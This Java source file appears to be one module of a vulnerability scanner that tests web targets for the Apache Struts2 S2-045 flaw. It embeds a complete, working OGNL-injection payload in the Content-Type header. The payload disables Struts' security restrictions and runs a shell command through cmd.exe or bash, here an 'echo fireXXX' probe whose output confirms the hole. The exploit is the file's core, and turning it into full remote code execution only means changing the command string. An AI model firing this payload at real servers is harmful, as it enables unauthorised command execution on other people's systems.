package action.url;

import global.GlobalSetting;
import global.UrlGlobalDeal;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Proxy.Type;
import java.net.URL;
import java.net.URLConnection;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import tools.Logger;
import tools.StringMatcher;
import tools.HttpConnectionUtils;

public class S2_045 {
	private static String contentType = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo fireXXX').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
	
	public void run(String target) {
		target = standardization(target);
		
		if (check(target)) {
			Logger.getInstance().insertResult(target);
		}
	}
	
	public static String standardization(String target) {
		if (!target.startsWith("http"))
			target = "http://"+target;
		
		return target;
	}
	
	private boolean check(String url) {
		HttpConnectionUtils utils = new HttpConnectionUtils();
		
		Map<String, String> headers = new HashMap<String, String>();
		headers.put("Content-Type", contentType);
		
		if (!utils.openConnection(url, "GET", headers))
			return false;
		
		String result = utils.readOneLineResponse();
		if (result == null)
			return false;
		
		if (StringMatcher.findString(result, "fireXXX", true)) {
			Logger.getInstance().insertLog("S2_045", url+":"+result);
        	return true;
		}

		return false;
	}
}
